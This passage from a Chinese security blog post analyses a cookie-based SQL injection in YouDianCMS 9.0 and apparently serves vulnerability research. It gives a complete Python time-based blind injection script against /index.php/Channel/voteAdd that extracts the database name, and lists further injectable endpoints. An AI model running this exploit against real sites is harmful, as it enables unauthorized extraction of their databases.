<p>最后返回 <code>sql</code> 语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> tp_count <span class="keyword">FROM</span> `youdian_wx_vote` <span class="keyword">WHERE</span> ( `AppID` <span class="operator">=</span> <span class="number">0</span> ) <span class="keyword">AND</span> (  (`FromUser` <span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> sleep(<span class="number">3</span>))a))  ) LIMIT <span class="number">1</span>  </span><br></pre></td></tr></table></figure>

<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">baseurl, payload</span>):</span></span><br><span class="line">    url = baseurl + <span class="string">&quot;/index.php/Channel/voteAdd&quot;</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;pn9iofrfklen68u4205veml8s0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;youdianAdminLangSet&quot;</span>: <span class="string">&quot;cn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;youdianfu[0]&quot;</span>: <span class="string">&quot;exp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;youdianfu[1]&quot;</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">    starttime = time.time()</span><br><span class="line">    s.get(url, cookies=cookies)</span><br><span class="line">    endtime = time.time()</span><br><span class="line">    <span class="keyword">if</span> endtime - starttime &gt;= <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span>(<span class="params">baseurl</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        payload = <span class="string">&quot;=(select 1 from(select if(length(database())=&#123;0&#125;,sleep(3),0))a)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">if</span> check(baseurl, payload):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] database len: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabase</span>(<span class="params">baseurl, length</span>):</span></span><br><span class="line">    stringset = string.digits + string.ascii_letters</span><br><span class="line">    database = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> stringset:</span><br><span class="line">            payload = <span class="string">&quot;=(select 1 from(select if(ascii(substr(database(), &#123;0&#125;, 1))=&#123;1&#125;,sleep(3),0))a)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i + <span class="number">1</span>), <span class="built_in">str</span>(<span class="built_in">ord</span>(j)))</span><br><span class="line">            <span class="keyword">if</span> check(baseurl, payload):</span><br><span class="line">                database += <span class="built_in">str</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] &quot;</span> + database)</span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/youdiancms9.0&#x27;</span></span><br><span class="line">    length = getLength(url)</span><br><span class="line">    getDatabase(url, length)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210702202939.png"></p>
<h2 id="一些其他可注入的点"><a href="#一些其他可注入的点" class="headerlink" title="一些其他可注入的点"></a>一些其他可注入的点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;Wap&#x2F;Channel&#x2F;voteAdd</span><br></pre></td></tr></table></figure>

<p>还有一些其他的，都是需要微信访问的，这个只要满足使用 <code>$this-&gt;_fromUser</code> 且最后进入了 where 方法的，几乎都可以被注入，因此这里挺多地方都是可以注入的</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞就是满足了两点，一是使用了已知的存在漏洞的框架，二是存在可控的变量，这也为我们代码审计提供了一些思路，可以多找找控制 <code>COOKIE</code> 的地方，这方面的防护相较于 <code>GET</code> <code>POST</code> 更为薄弱一些，然后就是多积累一些框架漏洞，不知道什么时候就使用到了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://forum.butian.net/share/132">https://forum.butian.net/share/132</a></li>
</ul>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2021/06/29/%E5%8F%8B%E7%82%B9CMS-V9-1-%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87-GetShell/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="Update time"></i>
              2021-06-30 20:56:15
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="Tags"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/php/" title="php">
                        <b>#</b> php
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
                        <b>#</b> sql注入
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E5%8F%8B%E7%82%B9cms/" title="友点cms">
                        <b>#</b> 友点cms
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2021/07/02/DedecmsV5-7-SP2-%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20129%EF%BC%89/" target="_self">
                <span>Next</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="toc-text">漏洞影响</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%86%E8%8A%82"><span class="toc-text">漏洞细节</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8E%A7%E5%88%B6"><span class="toc-text">变量控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-text">Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E5%8F%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E7%82%B9"><span class="toc-text">一些其他可注入的点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
  </div>


        <div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/N0puple/">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/N0puple/">Copyright © N0puple 2020</a>
        
    </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="back-to-top hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



      
  <div class="search-icon" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




    </div>
  </body>
</html>
